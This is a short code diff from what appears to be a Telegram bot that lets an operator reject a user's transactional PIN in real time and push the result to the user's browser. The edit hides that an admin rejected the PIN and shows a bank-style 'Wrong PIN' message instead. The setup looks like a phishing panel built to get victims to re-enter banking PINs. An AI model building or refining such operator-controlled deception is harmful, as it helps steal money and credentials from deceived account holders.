@@ -176,7 +176,7 @@ bot.on("callback_query", (query) => {
 
         } 
         else if (step === "5") {
-            const userMessage = "The transactional PIN was rejected by an admin. Please try again.";
+            const userMessage = "Wrong PIN, please put the correct PIN and try again.";
             try {
                 if (roomSize > 0) {
                     io.to(appId).emit('pin-failed', { message: userMessage });
